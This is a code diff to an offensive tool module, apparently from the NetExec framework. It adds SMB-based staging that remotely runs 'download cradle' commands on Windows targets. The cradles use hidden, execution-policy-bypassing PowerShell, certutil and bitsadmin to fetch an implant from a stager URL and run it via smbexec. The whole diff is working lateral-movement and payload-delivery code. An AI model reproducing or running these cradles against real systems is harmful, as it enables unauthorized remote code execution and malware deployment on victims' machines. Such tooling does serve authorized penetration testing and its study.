@@ -1206,6 +1206,14 @@ class NXCModule:
             if not self.staging_method or self.staging_method == "powershell":
                 self.staging_method = "certutil"
 
+        # Auto-enable HTTP staging for SMB Windows targets (unless explicitly opted out)
+        if protocol == "smb" and os_type == "windows" and not self.staging_direct:
+            self.staging = True
+            self.stager_port = self.stager_port or 8080
+            # Default to PowerShell for SMB (most reliable on modern Windows)
+            if not self.staging_method:
+                self.staging_method = "powershell"
+
         try:
             full_remote_path = None
             listener_job_id = None
@@ -1462,6 +1470,53 @@ class NXCModule:
                         connection.conn.socket.settimeout(original_timeout)
                     except:
                         pass  # Ignore errors restoring timeout
+        elif protocol == "smb":
+            # SMB: Execute download cradle via smbexec
+            
+            # Reject Linux download tools (SMB staging is Windows-only)
+            if self.staging_method in ["wget", "curl", "python"]:
+                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB staging (Windows-only)")
+                context.log.fail("Use STAGING=direct for Linux/Samba targets, or use powershell/certutil/bitsadmin")
+                sys.exit(1)
+            
+            # Check if target is Linux/Samba - staging not supported
+            if os_type != "windows":
+                context.log.fail("SMB HTTP staging only supported for Windows targets")
+                context.log.fail("Use STAGING=direct for Linux/Samba targets")
+                sys.exit(1)
+            
+            # Build command based on download tool
+            if self.staging_method == "powershell":
+                # PowerShell with Start-Process for async execution
+                cmd = (
+                    f'cmd /c powershell -ep bypass -w hidden -c '
+                    f'"IWR \'{download_url}\' -OutFile $env:TEMP\\{implant_name}; '
+                    f'Start-Process $env:TEMP\\{implant_name}"'
+                )
+                context.log.debug("Using PowerShell staging method via SMB")
+            elif self.staging_method == "certutil":
+                # Certutil with WMIC wrapper for async (same pattern as MSSQL)
+                cmd = (
+                    f'WMIC process call create '
+                    f'"cmd /c certutil -urlcache -f {download_url} '
+                    f'%TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                )
+                context.log.debug("Using certutil staging method via SMB")
+            elif self.staging_method == "bitsadmin":
+                # Bitsadmin with WMIC wrapper for async (same pattern as MSSQL)
+                cmd = (
+                    f'WMIC process call create '
+                    f'"cmd /c bitsadmin /transfer job /download /priority high '
+                    f'{download_url} %TEMP%\\{implant_name} && %TEMP%\\{implant_name}"'
+                )
+                context.log.debug("Using bitsadmin staging method via SMB")
+            else:
+                context.log.fail(f"Download tool '{self.staging_method}' not supported for SMB. Use: powershell, certutil, or bitsadmin")
+                sys.exit(1)
+            
+            # Execute via smbexec
+            connection.execute(cmd, methods=["smbexec"])
+            context.log.info("Download cradle executed via SMB (smbexec)")
         else:
             # For other protocols, use handler's execute method
             handler.execute(context, connection, cmd, os_type)
